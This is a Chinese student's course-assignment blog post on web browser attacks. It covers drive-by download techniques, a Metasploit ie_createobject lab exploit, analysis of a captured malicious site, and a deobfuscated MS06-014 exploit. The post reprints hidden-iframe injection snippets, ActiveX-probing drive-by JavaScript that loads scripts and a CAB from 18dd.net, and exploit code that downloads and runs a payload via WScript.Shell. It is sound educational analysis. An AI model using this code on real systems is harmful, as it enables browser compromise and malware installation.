@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+<head>
+	
+	
+	<link rel="stylesheet" href="/css/allinone.min.css">
+
+	
+
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<title>《网络攻防实践》第12周作业 | 醋小虾</title>
+
+	<meta name="HandheldFriendly" content="True">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+	<meta name="generator" content="hexo">
+	<meta name="author" content="醋小虾">
+	<meta name="description" content>
+
+	
+	<meta name="keywords" content>
+	
+
+	
+	<link rel="shortcut icon" href="https://img2020.cnblogs.com/blog/1800791/202009/1800791-20200911095425530-953711724.jpg">
+	<link rel="apple-touch-icon" href="https://img2020.cnblogs.com/blog/1800791/202009/1800791-20200911095425530-953711724.jpg">
+	
+
+	
+	<meta name="theme-color" content="#3c484e">
+	<meta name="msapplication-TileColor" content="#3c484e">
+	
+
+	
+
+	
+	<link rel="alternate" href="https://banpingcu.github.io" title="醋小虾">
+	
+
+	<meta property="og:site_name" content="醋小虾">
+	<meta property="og:type" content="article">
+	<meta property="og:title" content="《网络攻防实践》第12周作业  醋小虾">
+	<meta property="og:description" content>
+	<meta property="og:url" content="http://yoursite.com/2019/06/02/网络攻防/">
+
+	
+	<meta property="article:published_time" content="2019-06-02T21:06:00+08:00"> 
+	<meta property="article:author" content="醋小虾">
+	<meta property="article:published_first" content="醋小虾, /2019/06/02/网络攻防/">
+	
+</head>
+<body class="post-template">
+	<div class="site-wrapper">
+		
+
+
+
+
+<header class="site-header outer" style="z-index: 999">
+    <div class="inner">
+        
+<nav class="site-nav"> 
+    <div class="site-nav-left">
+        <ul class="nav">
+            <li>
+              
+               
+                <a href="/" title="Home">HOME</a>
+                
+            </li>
+            
+            
+            <li>
+                <a href="/archives" title="ARCHIVES">ARCHIVES</a>
+            </li>
+            
+            
+			<li>
+                <a href="http://bs.cuxiaoxia.cn?id=2" title="autor">AUTHOR</a>
+            </li>
+        </ul> 
+    </div>
+    
+    <div class="search-button">
+        <a href="#search" class="subscribe-button" style="margin: 0 10px;">Search ...</a>
+    </div>
+     
+
+    <div class="site-nav-right">
+        
+        <a href="#search" class="subscribe-button" style="margin: 0 10px;">Search ...</a>
+         
+        
+<div class="social-links">
+    
+    <a class="social-link" title="weibo" href="https://weibo.com/u/5687948403" target="_blank" rel="noopener">
+        <svg viewbox="0 0 1141 1024" xmlns="http://www.w3.org/2000/svg"><path d="M916.48 518.144q27.648 21.504 38.912 51.712t9.216 62.976-14.336 65.536-31.744 59.392q-34.816 48.128-78.848 81.92t-91.136 56.32-94.72 35.328-89.6 18.944-75.264 7.68-51.712 1.536-49.152-2.56-68.096-10.24-78.336-21.504-79.872-36.352-74.24-55.296-59.904-78.848q-16.384-29.696-22.016-63.488t-5.632-86.016q0-22.528 7.68-51.2t27.136-63.488 53.248-75.776 86.016-90.112q51.2-48.128 105.984-85.504t117.248-57.856q28.672-10.24 63.488-11.264t57.344 11.264q10.24 11.264 19.456 23.04t12.288 29.184q3.072 14.336 0.512 27.648t-5.632 26.624-5.12 25.6 2.048 22.528q17.408 2.048 33.792-1.536t31.744-9.216 31.232-11.776 33.28-9.216q27.648-5.12 54.784-4.608t49.152 7.68 36.352 22.016 17.408 38.4q2.048 14.336-2.048 26.624t-8.704 23.04-7.168 22.016 1.536 23.552q3.072 7.168 14.848 13.312t27.136 12.288 32.256 13.312 29.184 16.384zM658.432 836.608q26.624-16.384 53.76-45.056t44.032-64 18.944-75.776-20.48-81.408q-19.456-33.792-47.616-57.344t-62.976-37.376-74.24-19.968-80.384-6.144q-78.848 0-139.776 16.384t-105.472 43.008-72.192 60.416-38.912 68.608q-11.264 33.792-6.656 67.072t20.992 62.976 42.496 53.248 57.856 37.888q58.368 25.6 119.296 32.256t116.224 0.512 100.864-21.504 74.24-33.792zM524.288 513.024q20.48 8.192 38.912 18.432t32.768 27.648q10.24 12.288 17.92 30.72t10.752 39.424 1.536 42.496-9.728 38.912q-8.192 18.432-19.968 37.376t-28.672 35.328-40.448 29.184-57.344 18.944q-61.44 11.264-117.76-11.264t-88.064-74.752q-12.288-39.936-13.312-70.656t16.384-66.56q13.312-27.648 40.448-51.712t62.464-38.912 75.264-17.408 78.848 12.8zM361.472 764.928q37.888 3.072 57.856-18.432t21.504-48.128-15.36-47.616-52.736-16.896q-27.648 3.072-43.008 23.552t-17.408 43.52 9.728 42.496 39.424 21.504zM780.288 6.144q74.752 0 139.776 19.968t113.664 57.856 76.288 92.16 27.648 122.88q0 33.792-16.384 50.688t-35.328 17.408-35.328-14.336-16.384-45.568q0-40.96-22.528-77.824t-59.392-64.512-84.48-43.52-96.768-15.872q-31.744 0-47.104-15.36t-14.336-34.304 18.944-34.304 51.712-15.36zM780.288 169.984q95.232 0 144.384 48.64t49.152 146.944q0 30.72-10.24 43.52t-22.528 11.264-22.528-14.848-10.24-35.84q0-60.416-34.816-96.256t-93.184-35.84q-19.456 0-28.672-10.752t-9.216-23.04 9.728-23.04 28.16-10.752z"/></svg>
+    </a>
+    
+    
+    <a class="social-link" title="github" href="https://github.com/banpingcu" target="_blank" rel="noopener">
+        <svg viewbox="0 0 1049 1024" xmlns="http://www.w3.org/2000/svg"><path d="M524.979332 0C234.676191 0 0 234.676191 0 524.979332c0 232.068678 150.366597 428.501342 358.967656 498.035028 26.075132 5.215026 35.636014-11.299224 35.636014-25.205961 0-12.168395-0.869171-53.888607-0.869171-97.347161-146.020741 31.290159-176.441729-62.580318-176.441729-62.580318-23.467619-60.841976-58.234462-76.487055-58.234463-76.487055-47.804409-32.15933 3.476684-32.15933 3.476685-32.15933 53.019436 3.476684 80.83291 53.888607 80.83291 53.888607 46.935238 79.963739 122.553122 57.365291 152.97411 43.458554 4.345855-33.897672 18.252593-57.365291 33.028501-70.402857-116.468925-12.168395-239.022047-57.365291-239.022047-259.012982 0-57.365291 20.860106-104.300529 53.888607-140.805715-5.215026-13.037566-23.467619-66.926173 5.215027-139.067372 0 0 44.327725-13.906737 144.282399 53.888607 41.720212-11.299224 86.917108-17.383422 131.244833-17.383422s89.524621 6.084198 131.244833 17.383422C756.178839 203.386032 800.506564 217.29277 800.506564 217.29277c28.682646 72.1412 10.430053 126.029806 5.215026 139.067372 33.897672 36.505185 53.888607 83.440424 53.888607 140.805715 0 201.64769-122.553122 245.975415-239.891218 259.012982 19.121764 16.514251 35.636014 47.804409 35.636015 97.347161 0 70.402857-0.869171 126.898978-0.869172 144.282399 0 13.906737 9.560882 30.420988 35.636015 25.205961 208.601059-69.533686 358.967656-265.96635 358.967655-498.035028C1049.958663 234.676191 814.413301 0 524.979332 0z"/></svg>
+    </a>
+    
+    
+    
+    
+    
+    
+</div>
+    </div>
+</nav>
+    </div>
+</header>
+
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+        <header class="post-full-header">
+            <section class="post-full-meta">
+                <time class="post-full-meta-date" datetime="2019-06-02T13:01:24.000Z" itemprop="datePublished">
+                    2019-06-2
+                </time>
+                
+                <span class="date-divider">/</span>
+                
+                <a href="/categories/计算机/">计算机</a>&nbsp;&nbsp;
+                
+                
+            </section>
+            <h1 class="post-full-title">《网络攻防实践》第12周作业</h1>
+        </header>
+        <article class="post-full no-image">
+            
+            <section class="post-full-content">
+                <div id="lightgallery" class="markdown-body">
+                    <p><font color="blue" size="5">《网络攻防实践》第12周作业</font></p>
+<h2 id="总体结构"><a href="#总体结构" class="headerlink" title="总体结构"></a>总体结构</h2><table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>这个作业属于哪个课程</td>
+<td><a href="https://edu.cnblogs.com/campus/besti/19attackdefense" target="_blank" rel="noopener">https://edu.cnblogs.com/campus/besti/19attackdefense</a></td>
+</tr>
+<tr>
+<td>这个作业的要求在哪里</td>
+<td><a href="https://edu.cnblogs.com/campus/besti/19attackdefense/homework/10756" target="_blank" rel="noopener">https://edu.cnblogs.com/campus/besti/19attackdefense/homework/10756</a></td>
+</tr>
+<tr>
+<td>我在这个课程的目标是</td>
+<td>学习网络攻防知识，增强动手实践能力。</td>
+</tr>
+<tr>
+<td>这个作业在哪个具体方面帮助我实现目标</td>
+<td>学习Linux网络防御知识。</td>
+</tr>
+<tr>
+<td>作业正文</td>
+<td>见下</td>
+</tr>
+<tr>
+<td>参考文献</td>
+<td>[1].<a href="https://book.douban.com/subject/6558082/" target="_blank" rel="noopener">网络攻防实践-诸葛建伟</a><br></td>
+</tr>
+</tbody>
+</table>
+<p>[TOC]</p>
+<h2 id="1-实践内容"><a href="#1-实践内容" class="headerlink" title="1.实践内容"></a>1.实践内容</h2><h3 id="1-1-Web浏览器的技术发展和安全威胁"><a href="#1-1-Web浏览器的技术发展和安全威胁" class="headerlink" title="1.1 Web浏览器的技术发展和安全威胁"></a>1.1 Web浏览器的技术发展和安全威胁</h3><p>浏览器技术的发展特点主要包括安全性、速度性、扩展性以及隐私性。</p>
+<p><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200519075928100-1669290561.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200519075928100-1669290561.png"><br>| | |<br>|  —-  | —-  |<br>| Trident | 代表作品是IE，俗称IE内核；使用IE内核的浏览器包括、傲游、世界之窗、百度浏览器、兼容模式的浏览器等 |<br>| WebKit内核 | 代表作品是Safari、旧版的Chrome |<br>| Presto内核 | 代表作品是Opera，Presto是由Opera Software开发的浏览器排版引擎，它是世界公认最快的渲染速度的引擎。在13年之后，Opera宣布加入谷歌阵营，弃用了 Presto |<br>| Blink内核 | 代表作品是Chrome、Opera；由Google和Opera Software开发的浏览器排版引擎 |<br>| Gecko内核 | 代表作品是Firefox，俗称Firefox内核 |<br>| Chromium内核 | 这个比较特殊，Chromium是谷歌的开源项目是一款浏览器，Chrome 是Chromium的稳定版。国内的大部分双核浏览器都采用Chromium内核 |<br>Web浏览安全威胁位置<br>（1）针对传输网络的网络安全协议安全威胁<br>（2）针对Web端系统平台的安全威胁<br>（3）针对Web浏览器软件及插件程序的渗透攻击威胁<br>（4）针对互联网用户的社会工程学攻击威胁<br>网页木马的下载<br>（1）将木马伪装为页面元素。木马则会被浏览器自动下载到本地<br>（2）利用脚本运行的漏洞下载木马<br>（3）利用脚本运行的漏洞释放隐含在网页脚本中的木马<br>（4）将木马伪装为缺失的组件，或和缺失的组件捆绑在一起（例如：flash播放插件）。这样既达到了下载的目的，下载的组件又会被浏览器自动执行<br>（5）通过脚本运行调用某些com组件，利用其漏洞下载木马<br>（6）在渲染页面内容的过程中利用格式溢出释放木马（例如：ani格式溢出漏洞）<br>（7）在渲染页面内容的过程中利用格式溢出下载木马（例如：flash9.0.115的播放漏洞）<br>网页木马的执行<br>（1）利用页面元素渲染过程中的格式溢出执行shellcode进一步执行下载的木马<br>（2）利用脚本运行的漏洞执行木马<br>（3）伪装成缺失组件的安装包被浏览器自动执行<br>（4）通过脚本调用com组件利用其漏洞执行木马<br>（5）利用页面元素渲染过程中的格式溢出直接执行木马<br>（6）利用com组件与外部其他程序通讯，通过其他程序启动木马（例如：realplayer10.5存在的播放列表溢出漏洞）<br>挂马的方式<br>(1)为了保持网页木马的隐蔽性，网马会选择各种方法隐藏自己，如利用各种标签隐藏自己、代码中使用加密、混淆的技术，目的是降低被发现的可能性<br>(2)HTML隐藏标签<br>(3)JavaScript代码中引入<br>(4)其他网页技术<br>(5)其他挂马技术<br>HTML隐藏标签<br>(1)利用HTML的标签或者一些脚本引入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http://address width=0 height=0&gt;&lt;/iframe&gt; // 高宽为0，不会显示</span><br></pre></td></tr></table></figure></p>
+<p>(2)此类在页面的源码中还是很容易发现<br>JavaScript代码中引入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT src=“http://xx.js” type=text/javascript&gt;</span><br><span class="line">相对更难发现，因为网页往往有很多js引入</span><br><span class="line">document.write(&quot;&lt;iframe width=&apos;0&apos; height=&apos;0&apos; src=&apos;地 址&apos;&gt;&lt;/iframe&gt;&quot;)</span><br><span class="line">&lt;SCRIPT language=&quot;JScript.Encode&quot; </span><br><span class="line">src=http://www.xxx.com/mm.jpg&gt;&lt;/script&gt;</span><br><span class="line">&lt;SCRIPT language=javascript&gt;window.open(&quot;网页木马地址&quot;,&quot;&quot;,&quot;toolbar=no, </span><br><span class="line">location=no,directories=no,status=no,menubar=no,scrollbars=no,width=1,height=1&quot;); &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>JavaScript代码中引入<br>(3)利用URL欺骗，示例代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;http://www.163.com&quot; onMouseOver=&quot;www_163_com(); return true;&quot;&gt; x&lt;/a&gt;</span><br><span class="line">&lt;SCRIPT Language=&quot;JavaScript&quot;&gt;</span><br><span class="line">function www_163_com ()</span><br><span class="line">&#123;</span><br><span class="line">var url=&quot;网页木马地址&quot;;</span><br><span class="line">open(url,&quot;NewWindow&quot;,&quot;toolbar=no,location=no,</span><br><span class="line">directories=no,status=no,menubar=no, </span><br><span class="line">scrollbars=no,resizable=no,copyhistory=yes,width</span><br><span class="line">=800,height=600,left=10,top=10&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="2-实践过程"><a href="#2-实践过程" class="headerlink" title="2.实践过程"></a>2.实践过程</h2><h3 id="任务一：使用攻击机进行浏览器渗透攻击实践。"><a href="#任务一：使用攻击机进行浏览器渗透攻击实践。" class="headerlink" title="任务一：使用攻击机进行浏览器渗透攻击实践。"></a>任务一：使用攻击机进行浏览器渗透攻击实践。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//设置攻击程序</span><br><span class="line">use exploit/windows/browser/ie_createobject</span><br><span class="line">//攻击机及靶机地址地址</span><br><span class="line">set rhost 192.168.200.8</span><br><span class="line">set lhost 192.168.3.124</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p>复制地址<code>http://192.168.200.8:8080/0CePe8WNjhS8Vz</code><br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200520175641993-661486164.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200520175641993-661486164.png"></p>
+<p>靶机访问访问网址<br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200520175324887-141436635.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200520175324887-141436635.png"><br>攻击成功<br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521150430348-93605312.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521150430348-93605312.png"></p>
+<h3 id="任务二：网站挂马分析实践"><a href="#任务二：网站挂马分析实践" class="headerlink" title="任务二：网站挂马分析实践"></a>任务二：网站挂马分析实践</h3><p>说明：<br>这个挂马网站现在已经无法访问了，但蜜网课题组的成员保留了最初做分析时所有的原始文件。首先你应该访问 start.html，在这个文件中给出了 new09.htm 的地址，在进入 new09.htm后，每解密出一个文件地址，请对其作32位MD5散列，以散列值为文件名到<a href="http://192.168.68.253/scom/hashed/目录下去下载对应的文件" target="_blank" rel="noopener">http://192.168.68.253/scom/hashed/目录下去下载对应的文件</a>(注意：文件名中的英文字母为小写， 且没有扩展名)，即为解密出的地址对应的文件。如果解密出的地址给出的是网页或脚本文件，请继续解密；如果解密出的地址是二进程序文件，请进行静态反汇编或动态调试。重复以上过程直到这些文件被全部分析完成。请注意：被散列的文件地址应该是标准的 URL形式，形如 <a href="http://xx.18dd.net/a/b.htm，否则会导致散列值计算不正确而无法继续。" target="_blank" rel="noopener">http://xx.18dd.net/a/b.htm，否则会导致散列值计算不正确而无法继续。</a><br>问题：<br>1.试述你是如何一步步地从所给的网页中获取最后的真实代码的？<br>2.网页和 JavaScript 代码中都使用了什么样的加密方法？你是如何解密的？<br>3.从解密后的结果来看，攻击者利用了那些系统漏洞？<br>4.解密后发现了多少个可执行文件？其作用是什么？<br>5.这些可执行文件中有下载器么？如果有，它们下载了哪些程序？这些程序又是什么作用的？<br>根据实验指导书获取了钓鱼网站的大致结构<br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200520190516652-700807160.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200520190516652-700807160.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MD5(http://aa.18dd.net/aa/kl.htm,32) = 7f60672dcd6b5e90b6772545ee219bd3 </span><br><span class="line">MD5(http://js.users.51.la/1299644.js,32) = 23180a42a2ff1192150231b44ffdf3d3</span><br></pre></td></tr></table></figure></p>
+<p>查看hashed文件中对应的文件.<br>23180a42a2ff1192150231b44ffdf3d3<br><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521065058793-277331426.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521065058793-277331426.png"><br>7f60672dcd6b5e90b6772545ee219bd3<br>加密方式：Base64编码, xxtea加密(密钥：script),<br><a href="http://tool.chacuo.net/cryptxtea" target="_blank" rel="noopener">加解密网站</a> 密钥为script<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">eval(&quot;function init()&#123;doc?x75ment.write();&#125;</span><br><span class="line">window.onload = init;</span><br><span class="line">if(document.cookie.indexOf(&apos;OK&apos;)==-1)&#123;</span><br><span class="line">try&#123;var e;</span><br><span class="line">var ado=(document.createElement(&quot;object&quot;));</span><br><span class="line">ado.setAttribute(&quot;classid&quot;,&quot;clsid:BD96C556-65A3-11D0-983A-00C04FC29E36&quot;);</span><br><span class="line">var as=ado.createobject(&quot;Adodb.Stream&quot;,&quot;&quot;)&#125;</span><br><span class="line">catch(e)&#123;&#125;;</span><br><span class="line">finally&#123;</span><br><span class="line">var expires=new Date();</span><br><span class="line">expires.setTime(expires.getTime()+24*60*60*1000);</span><br><span class="line">document.cookie=&apos;ce=windowsxp;path=/;expires=&apos;+expires.toGMTString();</span><br><span class="line">if(e!=&quot;[object Error]&quot;)&#123;</span><br><span class="line">document.write(&quot;&lt;script src=http:\/\/aa.18dd.net\/aa\/1.js&gt;&lt;\/script&gt;&quot;)&#125;</span><br><span class="line">else&#123;</span><br><span class="line">try&#123;var f;var storm=new ActiveXObject(&quot;MPS.StormPlayer&quot;);&#125;</span><br><span class="line">catch(f)&#123;&#125;;</span><br><span class="line">finally&#123;if(f!=&quot;[object Error]&quot;)&#123;</span><br><span class="line">document.write(&quot;&lt;script src=http:\/\/aa.18dd.net\/aa\/b.js&gt;&lt;\/script&gt;&quot;)&#125;&#125;</span><br><span class="line">try&#123;var g;var pps=new ActiveXObject(&quot;POWERPLAYER.PowerPlayerCtrl.1&quot;);&#125;</span><br><span class="line">catch(g)&#123;&#125;;</span><br><span class="line">finally&#123;if(g!=&quot;[object Error]&quot;)&#123;</span><br><span class="line">document.write(&quot;&lt;script src=http:\/\/aa.18dd.net\/aa\/pps.js&gt;&lt;\/script&gt;&quot;)&#125;&#125;</span><br><span class="line">try&#123;var h;var obj=new ActiveXObject(&quot;BaiduBar.Tool&quot;);&#125;</span><br><span class="line">catch(h)&#123;&#125;;</span><br><span class="line">finally&#123;if(h!=&quot;[object Error]&quot;)&#123;</span><br><span class="line">obj.DloadDS(&quot;http://down.18dd.net/bb/bd.cab&quot;, &quot;bd.exe&quot;, 0)&#125;&#125;</span><br><span class="line">&#125;&#125;&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>MS06-014网马：攻击MS06-014安全漏洞，MDAC RDS.Dataspace ActiveX控件远程代码执行漏洞<br>暴风影音网马：攻击CVE-2007-4816安全漏洞，暴风影音2 mps.dll组件多个缓冲区溢出漏洞<br>PPStream网马：攻击CVE-2007-4748安全漏洞，PPStream 堆栈溢出<br>IDA Pro打开这个pps.exe，查看其字符串。<br>首先这个软件会下载一堆木马文件*.exe。</p>
+<p><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521071223574-1482162661.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521071223574-1482162661.png"></p>
+<p>生成自动运行的文件(“:\AutoRun.inf”，”[AutoRun] open=”，”AutoRun.inf”，”shell\Auto\command=”)</p>
+<p><img alt class="post-img b-lazy" href="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521071328767-1928612991.png" data-src="https://img2020.cnblogs.com/blog/1800791/202005/1800791-20200521071328767-1928612991.png"></p>
+<p>百度搜霸网马攻击：CVE-2007-4105安全漏洞百度搜霸ActiveX控件远程代码执行漏洞<br>盗号木马4.Exe释放的特殊文件<br>$WINDOWS\Fonts\enweafx.fon<br>伪装为Windows字体文件，内容却是一个加密的可疑URL地址<br>Url1=EC1A060602485D5D0505055C02064B47420B005C111C5D1907084A0A185D021D01065C130102<br>使用了一种简单加密方法<br>特殊文件解密结果<br> 密文=EC 1A 06 06 02 48 5D 5D 05 05 05 5C 02 06 4B 47 42 0B 00 5C 11 1C 5D 19 07 08 4A 0A 18 5D 02 1D 01 06 5C 13 01 02</p>
+<p> 明文= 68 74 74 70 3A 2F 2F 77 77 77 2E 70 74 39 35 30 79 72 2E 63 6E 2F 6B 75 7A 38 78 6A 2F 70 6F 73 74 2E 61 73 70</p>
+<p> 明文 <a href="http://www.pt950yr.cn/kuz8xj/post.asp" target="_blank" rel="noopener">http://www.pt950yr.cn/kuz8xj/post.asp</a></p>
+<p>解密方法：XOR 0x72</p>
+<h3 id="任务三：-Web浏览器渗透攻击对抗实验"><a href="#任务三：-Web浏览器渗透攻击对抗实验" class="headerlink" title="任务三： Web浏览器渗透攻击对抗实验"></a>任务三： Web浏览器渗透攻击对抗实验</h3><p>打开实验中的ms06-014漏洞的js代码。使用下面的工具进行美化<br><a href="https://www.sojson.com/jsjiemi.html" target="_blank" rel="noopener">js混淆解密在线工具</a><br>之后得到的js代码如下所示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt; html &gt; &lt; head &gt; &lt; title &gt; &lt; /title&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot;&gt;function KnAmGt(o,n)</span><br><span class="line">&#123;var r=null;try&#123;eval(&quot;r=o.CreateObject(n)&quot;)&#125;catch(e)&#123;&#125;if(!r)			  &#123;try&#123;eval(&quot;r=o.CreateObject(n,&apos;&apos;)&quot;)&#125;catch(e)&#123;&#125;&#125;if(!r)&#123;try&#123;eval(&quot;r=o.CreateObject(n,&apos;&apos;,&apos;&apos;)&quot;)&#125;catch(e)&#123;&#125;&#125;if(!r)&#123;try&#123;eval(&quot;r=o.GetObject(&apos;&apos;,n)&quot;)&#125;catch(e)&#123;&#125;&#125;if(!r)&#123;try&#123;eval(&quot;r=o.GetObject(n,&apos;&apos;)&quot;)&#125;catch(e)&#123;&#125;&#125;if(!r)&#123;try&#123;eval(&quot;r=o.GetObject(n)&quot;)&#125;catch(e)&#123;&#125;&#125;return(r)&#125;function hRZsZenIWZGSquVYwDztwzXS(a)&#123;var s=KnAmGt(a,&quot;WScript.Shell&quot;);var o=KnAmGt(a,&quot;ADODB.Stream&quot;);var e=s.Environment(&quot;Process&quot;);var url=document.location+&apos;/payload&apos;;var xml=null;var bin=e.Item(&quot;TEMP&quot;)+&quot;\\KvJyzvxl.exe&quot;;var dat;try&#123;xml=new XMLHttpRequest()&#125;catch(e)&#123;try&#123;xml=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;)&#125;catch(e)&#123;xml=new ActiveXObject(&quot;MSXML2.ServerXMLHTTP&quot;)&#125;&#125;if(!xml)&#123;return(0)&#125;xml.open(&quot;GET&quot;,url,false);xml.send(null);dat=xml.responseBody;o.Type=1;o.Mode=3;o.Open();o.Write(dat);o.SaveToFile(bin,2);s.Run(bin,0)&#125;function EeqjlsFOA()&#123;var i=0;var t=new Array(&apos; &#123;</span><br><span class="line">BD96C556 - 65A3 - 11D0 - 983A - 00C04FC29E36</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">BD96C556 - 65A3 - 11D0 - 983A - 00C04FC29E30</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">7F5B7F63 - F06F - 4331 - 8A26 - 339E03C0AE3D</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">6e32070a - 766d - 4ee6 - 879c - dc1fa91d2fc3</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">6414512B - B978 - 451D - A0D8 - FCFDF33E833C</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">06723E09 - F4C2 - 43c8 - 8358 - 09FCD1DB0766</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">639F725F - 1B2D - 4831 - A9FD - 874847682010</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">BA018599 - 1DB3 - 44f9 - 83B4 - 461454C84BF8</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">D0C07D56 - 7C69 - 43F1 - B4A0 - 25F5A11FAB19</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">E8CCCDDF - CA28 - 496b - B050 - 6C07C962476B</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">AB9BCEDD - EC7E - 47E1 - 9322 - D4A210617116</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">0006F033 - 0000 - 0000 - C000 - 000000000046</span><br><span class="line">&#125;</span><br><span class="line">&apos;,&apos; &#123;</span><br><span class="line">0006F03A - 0000 - 0000 - C000 - 000000000046</span><br><span class="line">&#125;</span><br><span class="line">&apos;,null);while(t[i])&#123;var a=null;if(t[i].substring(0,1)==&apos; &#123;</span><br><span class="line">&apos;)&#123;a=document.createElement(&quot;object&quot;);a.setAttribute(&quot;classid&quot;,&quot;clsid:&quot;+t[i].substring(1,t[i].length-1))&#125;else&#123;try&#123;a=new ActiveXObject(t[i])&#125;catch(e)&#123;&#125;&#125;if(a)&#123;try&#123;var b=KnAmGt(a,&quot;WScript.Shell&quot;);if(b)&#123;hRZsZenIWZGSquVYwDztwzXS(a);return(0)&#125;&#125;catch(e)&#123;&#125;&#125;i++&#125;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=&apos;</span><br><span class="line">EeqjlsFOA()</span><br><span class="line">&apos;&gt;GNNkmzjVHPe&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
